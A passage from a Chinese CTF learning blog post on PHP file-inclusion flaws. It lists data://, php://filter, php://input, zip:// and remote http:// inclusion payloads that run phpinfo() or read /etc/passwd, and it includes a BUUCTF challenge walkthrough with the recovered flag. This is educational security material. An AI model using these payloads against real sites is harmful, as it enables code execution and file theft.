+<p>payload3：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data:text/plain">http://127.0.0.1/1.php?file=data:text/plain</a>,&lt;?php phpinfo();?&gt;</p>
+<p>payload4：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==">http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</a></p>
+<p>payload5：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
+<p><strong>data://text/plain,</strong></p>
+<p>payload6：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data://text/plain">http://127.0.0.1/1.php?file=data://text/plain</a>,&lt;?php phpinfo();</p>
+<p>payload7：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data://text/plain">http://127.0.0.1/1.php?file=data://text/plain</a>,&lt;?php phpinfo()?&gt;</p>
+<p>payload8：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data://text/plain">http://127.0.0.1/1.php?file=data://text/plain</a>,&lt;?php phpinfo();?&gt;</p>
+<p>payload9：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==">http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</a></p>
+<p>payload10：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
+</blockquote>
+<p>这里总结一下10种payload的特殊情况👇</p>
+<ol>
+<li>在不进行base64编码时，上述1-3，6-8共6种情况可以执行，其中 <code>&lt;?php phpinfo()</code>不能执行（此时没有；）</li>
+<li>在进行base64编码时，上述4-5，9-10共4种情况可以执行，其中<code>&lt;?php phpinfo();?&gt;</code>不能执行 （此时有；）</li>
+<li>在进行base64编码时，上述4-5，9-10共4种情况可以执行，其中<code>&lt;?php phpinfo()</code>不能执行 （此时没有；）</li>
+</ol>
+<p>表格总结</p>
+<table>
+<thead>
+<tr>
+<th>普通</th>
+<th>base64</th>
+<th>是否可执行</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;?php phpinfo();</td>
+<td>&lt;?php phpinfo();</td>
+<td>均可执行</td>
+</tr>
+<tr>
+<td>&lt;?php phpinfo()?&gt;</td>
+<td>&lt;?php phpinfo()?&gt;</td>
+<td>均可执行</td>
+</tr>
+<tr>
+<td>&lt;?php phpinfo();?&gt;</td>
+<td>&lt;?php phpinfo();?&gt;</td>
+<td>base64不能执行</td>
+</tr>
+<tr>
+<td>&lt;?php phpinfo()</td>
+<td>&lt;?php phpinfo()</td>
+<td>均不可执行</td>
+</tr>
+</tbody></table>
+<p>还有一种读取图片的利用方法：data://image/jpeg;base64,base64_encode(xxxxxxx)</p>
+<p><strong>2.适用函数</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>是否需要配合打印函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>否(自动输出)</td>
+</tr>
+</tbody></table>
+<p>其他文件读取函数也可以使用data://伪协议，但是只有上述4种能达到代码执行效果</p>
+<h2 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
+<p><strong>1.BUUCT——[ACTF2020 新生赛]Include</strong></p>
+<p>打开题目会有一个tips的a标签，点击后跳转到url?file=flag.php，可以猜测存在文件包含漏洞</p>
+<p>利用php://filter任意文件读取，将php代码进行base64编码输出</p>
+<p>payload：?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>解码base64拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDgyN2FhOWQtMjlhYi00NmRhLWI0YTQtYTBmZDk5NDhkNzMxfQo=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;0827aa9d-29ab-46da-b4a4-a0fd9948d731&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>php版本</th>
+<th>allow_url_fopen</th>
+<th>allow_url_include</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file://</td>
+<td>&gt;=5.2</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>&gt;=5.2</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>&gt;=5.2</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>&gt;=5.2</td>
+<td>On/Off</td>
+<td><strong>On</strong></td>
+</tr>
+<tr>
+<td>http://</td>
+<td>&gt;=5.2</td>
+<td><strong>On</strong></td>
+<td><strong>On</strong></td>
+</tr>
+<tr>
+<td>data://</td>
+<td>&gt;=5.2</td>
+<td><strong>On</strong></td>
+<td><strong>On</strong></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>测试语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file://</td>
+<td>url?file=file:///etc/passwd</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>url?file=php://filter/read=convert.base64-encode/resource=index.php</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>url?file=zip:///var/www/html/xx.zip%23info.txt</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>url?file=php://inpit            [POST DATA] &lt;?php phpinfo()?&gt;</td>
+</tr>
+<tr>
+<td>http://</td>
+<td>url?file=<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/phpinfo.txt">http://xx.xx.xx.xx/phpinfo.txt</a>               phpinfo内容-&gt;&lt;?php phpinfo()?&gt;</td>
+</tr>
+<tr>
+<td>data://</td>
+<td>url?file=data://text/plain,&lt;?php phpinfo()?&gt;    <br />或  file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td>
+</tr>
+</tbody></table>
+<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><blockquote>
+<p>phpinfo中值得注意的信息：<a target="_blank" rel="noopener" href="https://seaii-blog.com/index.php/2017/10/25/73.html">https://seaii-blog.com/index.php/2017/10/25/73.html</a></p>
+<p>谈一谈php://filter的妙用：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">False</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.falsectf.top/2020/07/26/bf2843ff.html">http://blog.falsectf.top/2020/07/26/bf2843ff.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.falsectf.top" target="_blank">False</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB/">WEB</a></div><div class="post_share"><div class="social-share" data-image="/images/logo/file_include.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/06/4e16e28a.html"><img class="prev-cover" src="/images/logo/Volatility.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Volatility&amp;mimikatz</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/25/e0a8211b.html"><img class="next-cover" src="/img/featureimages/DASCTF-7.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">安恒杯2020-7月月赛</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/02/28/cb27.html" title="WEB-刷题记录"><img class="cover" src="/img/featureimages/16.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-28</div><div class="title">WEB-刷题记录</div></div></a></div><div><a href="/2020/08/13/57c1f6bc.html" title="PHP变量覆盖学习"><img class="cover" src="/images/logo/php-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-13</div><div class="title">PHP变量覆盖学习</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">False</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" href="http://blog.falsectf.top/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">给博客换了一个新的主题！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%A2%E6%88%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞形成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">基本利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">进阶利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B"><span class="toc-number">3.3.</span> <span class="toc-text">伪协议简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-file"><span class="toc-number">3.4.</span> <span class="toc-text">0x01 file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-http"><span class="toc-number">3.5.</span> <span class="toc-text">0x02 http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-php-filter"><span class="toc-number">3.6.</span> <span class="toc-text">0x03 php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-php-input"><span class="toc-number">3.7.</span> <span class="toc-text">0x04 php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-zip"><span class="toc-number">3.8.</span> <span class="toc-text">0x05 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-data"><span class="toc-number">3.9.</span> <span class="toc-text">0x06 data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="toc-number">4.</span> <span class="toc-text">例题演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考连接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/01/02/452.html" title="数据结构">数据结构</a><time datetime="2021-01-02T09:54:13.000Z" title="发表于 2021-01-02 17:54:13">2021-01-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/27/fe8aaca1.html" title="启明星辰杯决赛"><img src="/images/AWD/2020-%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="启明星辰杯决赛"/></a><div class="content"><a class="title" href="/2020/12/27/fe8aaca1.html" title="启明星辰杯决赛">启明星辰杯决赛</a><time datetime="2020-12-27T03:00:39.000Z" title="发表于 2020-12-27 11:00:39">2020-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/13/57c1f6bc.html" title="PHP变量覆盖学习"><img src="/images/logo/php-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP变量覆盖学习"/></a><div class="content"><a class="title" href="/2020/08/13/57c1f6bc.html" title="PHP变量覆盖学习">PHP变量覆盖学习</a><time datetime="2020-08-13T14:55:03.000Z" title="发表于 2020-08-13 22:55:03">2020-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/06/4e16e28a.html" title="Volatility&amp;mimikatz"><img src="/images/logo/Volatility.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Volatility&amp;mimikatz"/></a><div class="content"><a class="title" href="/2020/08/06/4e16e28a.html" title="Volatility&amp;mimikatz">Volatility&amp;mimikatz</a><time datetime="2020-08-06T02:24:22.000Z" title="发表于 2020-08-06 10:24:22">2020-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/26/bf2843ff.html" title="WEB-文件包含-学习踩坑"><img src="/images/logo/file_include.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEB-文件包含-学习踩坑"/></a><div class="content"><a class="title" href="/2020/07/26/bf2843ff.html" title="WEB-文件包含-学习踩坑">WEB-文件包含-学习踩坑</a><time datetime="2020-07-26T05:43:35.000Z" title="发表于 2020-07-26 13:43:35">2020-07-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/logo/file_include.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By False</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a  href="icp链接"><img  class="icp-icon"  src="/img/icp.png"><span>备案号:辽ICP备20001056号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'Ag2uepRff9ApH80TgBsjY86F-gzGzoHsz',
+      appKey: 'wz6QtWNN51S4GBYV3ef1fYwW',
+      placeholder: '记得留下你的ID和邮箱....可以快速收到回复',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_亲亲":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再见":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_发怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_发财":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可爱":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_呕吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_坏笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尴尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_惊吓":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
